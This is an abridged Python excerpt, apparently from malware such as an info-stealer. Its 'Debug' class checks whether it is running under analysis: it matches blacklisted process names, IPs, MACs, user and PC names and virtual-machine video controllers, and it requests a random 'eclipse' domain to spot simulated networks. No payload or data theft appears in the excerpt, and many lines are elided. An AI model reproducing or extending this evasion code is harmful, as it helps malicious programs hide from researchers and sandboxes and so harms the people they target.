...
class Debug:
    def __init__(self):
        ...
        self.blacklisted_video_controllers = [
            "virtualbox",
            "vmware",
            "qemu",
            "parallels",
    ...
    def checks(self):
        return (
            ...
            or self.get_network()
            or self.get_system()
            or self.checkHTTPSimulation()
            or self.checkVideoController()
        )

    def check_process(self) -> bool:
        for proc in psutil.process_iter(["name", "pid"]):
            if any(
                procstr in proc.name().lower() for procstr in self.blacklisted_processes
            ):
                try:
        ...
        try:
            ...
            for _, addresses in network_interfaces.items():
                for address in addresses:
                    if (
                        address.address in self.blacklisted_ips
                        or address.address in self.blacklisted_macs
                    ):
                        return True
        except Exception:
            pass
    ...
    def get_system(self) -> bool:
        try:
            if (
                os.getenv("USERNAME").lower() in self.blacklisted_users
                or os.getenv("COMPUTERNAME").lower() in self.blacklisted_pc_names
            ):
                return True
    ...
    def checkVideoController(self) -> bool:
        ...
        r1 = any(
            controller in video_controller
            for controller in self.blacklisted_video_controllers
        )
    ...
    def checkHTTPSimulation(self) -> bool:
        try:
            requests.get(
                f'https://eclipse-{"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))}.in'
            )
        except Exception:
            return False
        else:
